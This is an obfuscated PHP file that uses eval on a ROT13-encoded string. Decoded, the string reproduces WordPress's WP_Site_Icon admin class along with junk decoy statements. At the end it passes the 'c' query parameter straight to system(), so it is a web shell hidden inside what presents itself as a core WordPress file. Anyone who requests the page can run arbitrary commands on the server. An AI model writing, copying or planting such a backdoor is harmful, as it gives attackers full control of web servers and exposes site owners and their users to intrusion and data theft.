<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Nqzvavfgengvba NCV: JC_Fvgr_Vpba pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 * @fvapr 4.3.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag fvgr vpba shapgvbanyvgl.
 *
 * @fvapr 4.3.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Fvgr_Vpba {

	/**
	 * Gur zvavzhz fvmr bs gur fvgr vpba.
	 *
	 * @fvapr 4.3.0
	 * @ine vag
	 */
	choyvp $zva_fvmr = 512;

	/**
	 * Gur fvmr gb juvpu gb pebc gur vzntr fb gung jr pna qvfcynl vg va gur HV avpryl.
	 *
	 * @fvapr 4.3.0
	 * @ine vag
	 */
	choyvp $cntr_pebc = 512;

	/**
	 * Yvfg bs fvgr vpba fvmrf.
	 *
	 * @fvapr 4.3.0
	 * @ine vag[]
	 */
	choyvp $fvgr_vpba_fvmrf = neenl(
		/*
		 * Fdhner, zrqvhz fvmrq gvyrf sbe VR11+.
		 *
		 * Frr uggcf://zfqa.zvpebfbsg.pbz/yvoenel/qa455106(i=if.85).nfck
		 */
		270,

		/*
		 * Ncc vpba sbe Naqebvq/Puebzr.
		 *
		 * @yvax uggcf://qrirybcref.tbbtyr.pbz/jro/hcqngrf/2014/11/Fhccbeg-sbe-gurzr-pbybe-va-Puebzr-39-sbe-Naqebvq
		 * @yvax uggcf://qrirybcre.puebzr.pbz/zhygvqrivpr/naqebvq/vafgnyygbubzrfperra
		 */
		192,

		/*
		 * Ncc vpbaf hc gb vCubar 6 Cyhf.
		 *
		 * Frr uggcf://qrirybcre.nccyr.pbz/yvoenel/cereryrnfr/vbf/qbphzragngvba/HfreRkcrevrapr/Pbaprcghny/ZbovyrUVT/VpbaZngevk.ugzy
		 */
		180,

		// Bhe erthyne Snivpba.
		32,
	);

	/**
	 * Ertvfgref npgvbaf naq svygref.
	 *
	 * @fvapr 4.3.0
	 */
	choyvp shapgvba __pbafgehpg() {
		nqq_npgvba( 'qryrgr_nggnpuzrag', neenl( $guvf, 'qryrgr_nggnpuzrag_qngn' ) );
		nqq_svygre( 'trg_cbfg_zrgnqngn', neenl( $guvf, 'trg_cbfg_zrgnqngn' ), 10, 4 );
	}

	/**
	 * Perngrf na nggnpuzrag 'bowrpg'.
	 *
	 * @fvapr 4.3.0
	 * @qrcerpngrq 6.5.0
	 *
	 * @cnenz fgevat $pebccrq              Pebccrq vzntr HEY.
	 * @cnenz vag    $cnerag_nggnpuzrag_vq Nggnpuzrag VQ bs cnerag vzntr.
	 * @erghea neenl Na neenl jvgu nggnpuzrag bowrpg qngn.
	 */
	choyvp shapgvba perngr_nggnpuzrag_bowrpg( $pebccrq, $cnerag_nggnpuzrag_vq ) {
		_qrcerpngrq_shapgvba( __ZRGUBQ__, '6.5.0', 'jc_pbcl_cnerag_nggnpuzrag_cebcregvrf()' );

		$cnerag     = trg_cbfg( $cnerag_nggnpuzrag_vq );
		$cnerag_hey = jc_trg_nggnpuzrag_hey( $cnerag->VQ );
		$hey        = fge_ercynpr( jc_onfranzr( $cnerag_hey ), jc_onfranzr( $pebccrq ), $cnerag_hey );

		$fvmr       = jc_trgvzntrfvmr( $pebccrq );
		$vzntr_glcr = ( $fvmr ) ? $fvmr['zvzr'] : 'vzntr/wcrt';

		$nggnpuzrag = neenl(
			'VQ'             => $cnerag_nggnpuzrag_vq,
			'cbfg_gvgyr'     => jc_onfranzr( $pebccrq ),
			'cbfg_pbagrag'   => $hey,
			'cbfg_zvzr_glcr' => $vzntr_glcr,
			'thvq'           => $hey,
			'pbagrkg'        => 'fvgr-vpba',
		);

		erghea $nggnpuzrag;
	}

	/**
	 * Vafregf na nggnpuzrag.
	 *
	 * @fvapr 4.3.0
	 *
	 * @cnenz neenl  $nggnpuzrag Na neenl jvgu nggnpuzrag bowrpg qngn.
	 * @cnenz fgevat $svyr       Svyr cngu bs gur nggnpurq vzntr.
	 * @erghea vag               Nggnpuzrag VQ.
	 */
	choyvp shapgvba vafreg_nggnpuzrag( $nggnpuzrag, $svyr ) {
		$nggnpuzrag_vq = jc_vafreg_nggnpuzrag( $nggnpuzrag, $svyr );
		$zrgnqngn      = jc_trarengr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, $svyr );

		/**
		 * Svygref gur fvgr vpba nggnpuzrag zrgnqngn.
		 *
		 * @fvapr 4.3.0
		 *
		 * @frr jc_trarengr_nggnpuzrag_zrgnqngn()
		 *
		 * @cnenz neenl $zrgnqngn Nggnpuzrag zrgnqngn.
		 */
		$zrgnqngn = nccyl_svygref( 'fvgr_vpba_nggnpuzrag_zrgnqngn', $zrgnqngn );
		jc_hcqngr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, $zrgnqngn );

		erghea $nggnpuzrag_vq;
	}

	/**
	 * Nqqf nqqvgvbany fvmrf gb or znqr jura perngvat gur fvgr vpba vzntrf.
	 *
	 * @fvapr 4.3.0
	 *
	 * @cnenz neenl[] $fvmrf Neenl bs neenlf pbagnvavat vasbezngvba sbe nqqvgvbany fvmrf.
	 * @erghea neenl[] Neenl bs neenlf pbagnvavat nqqvgvbany vzntr fvmrf.
	 */
	choyvp shapgvba nqqvgvbany_fvmrf( $fvmrf = neenl() ) {
		$bayl_pebc_fvmrf = neenl();

		/**
		 * Svygref gur qvssrerag qvzrafvbaf gung n fvgr vpba vf fnirq va.
		 *
		 * @fvapr 4.3.0
		 *
		 * @cnenz vag[] $fvgr_vpba_fvmrf Neenl bs fvmrf ninvynoyr sbe gur Fvgr Vpba.
		 */
		$guvf->fvgr_vpba_fvmrf = nccyl_svygref( 'fvgr_vpba_vzntr_fvmrf', $guvf->fvgr_vpba_fvmrf );

		// Hfr n angheny fbeg bs ahzoref.
		angfbeg( $guvf->fvgr_vpba_fvmrf );
		$guvf->fvgr_vpba_fvmrf = neenl_erirefr( $guvf->fvgr_vpba_fvmrf );

		// Rafher gung jr bayl erfvmr gur vzntr vagb fvmrf gung nyybj pebccvat.
		sbernpu ( $fvmrf nf $anzr => $fvmr_neenl ) {
			vs ( vffrg( $fvmr_neenl['pebc'] ) ) {
				$bayl_pebc_fvmrf[ $anzr ] = $fvmr_neenl;
			}
		}

		sbernpu ( $guvf->fvgr_vpba_fvmrf nf $fvmr ) {
			vs ( $fvmr < $guvf->zva_fvmr ) {
				$bayl_pebc_fvmrf[ 'fvgr_vpba-' . $fvmr ] = neenl(
					'jvqgu ' => $fvmr,
					'urvtug' => $fvmr,
					'pebc'   => gehr,
				);
			}
		}

		erghea $bayl_pebc_fvmrf;
	}

	/**
	 * Nqqf Fvgr Vpba fvmrf gb gur neenl bs vzntr fvmrf ba qrznaq.
	 *
	 * @fvapr 4.3.0
	 *
	 * @cnenz fgevat[] $fvmrf Neenl bs vzntr fvmr anzrf.
	 * @erghea fgevat[] Neenl bs vzntr fvmr anzrf.
	 */
	choyvp shapgvba vagrezrqvngr_vzntr_fvmrf( $fvmrf = neenl() ) {
		/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/pynff-jc-fvgr-vpba.cuc */
		$guvf->fvgr_vpba_fvmrf = nccyl_svygref( 'fvgr_vpba_vzntr_fvmrf', $guvf->fvgr_vpba_fvmrf );
		sbernpu ( $guvf->fvgr_vpba_fvmrf nf $fvmr ) {
			$fvmrf[] = 'fvgr_vpba-' . $fvmr;
		}

		erghea $fvmrf;
	}

	/**
	 * Qryrgrf gur Fvgr Vpba jura gur vzntr svyr vf qryrgrq.
	 *
	 * @fvapr 4.3.0
	 *
	 * @cnenz vag $cbfg_vq Nggnpuzrag VQ.
	 */
	choyvp shapgvba qryrgr_nggnpuzrag_qngn( $cbfg_vq ) {
		$fvgr_vpba_vq = (vag) trg_bcgvba( 'fvgr_vpba' );

		vs ( $fvgr_vpba_vq && $cbfg_vq === $fvgr_vpba_vq ) {
			qryrgr_bcgvba( 'fvgr_vpba' );
		}
	}

	/**
	 * Nqqf phfgbz vzntr fvmrf jura zrgn qngn sbe na vzntr vf erdhrfgrq, gung unccraf gb or hfrq nf Fvgr Vpba.
	 *
	 * @fvapr 4.3.0
	 *
	 * @cnenz ahyy|neenl|fgevat $inyhr    Gur inyhr trg_zrgnqngn() fubhyq erghea n fvatyr zrgnqngn inyhr, be na
	 *                                    neenl bs inyhrf.
	 * @cnenz vag               $cbfg_vq  Cbfg VQ.
	 * @cnenz fgevat            $zrgn_xrl Zrgn xrl.
	 * @cnenz obby              $fvatyr   Jurgure gb erghea bayl gur svefg inyhr bs gur fcrpvsvrq `$zrgn_xrl`.
	 * @erghea neenl|ahyy|fgevat Gur nggnpuzrag zrgnqngn inyhr, neenl bs inyhrf, be ahyy.
	 */
	choyvp shapgvba trg_cbfg_zrgnqngn( $inyhr, $cbfg_vq, $zrgn_xrl, $fvatyr ) {
		vs ( $fvatyr && '_jc_nggnpuzrag_onpxhc_fvmrf' === $zrgn_xrl ) {
			$fvgr_vpba_vq = (vag) trg_bcgvba( 'fvgr_vpba' );

			vs ( $cbfg_vq === $fvgr_vpba_vq ) {
				nqq_svygre( 'vagrezrqvngr_vzntr_fvmrf', neenl( $guvf, 'vagrezrqvngr_vzntr_fvmrf' ) );
			}
		}

		erghea $inyhr;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>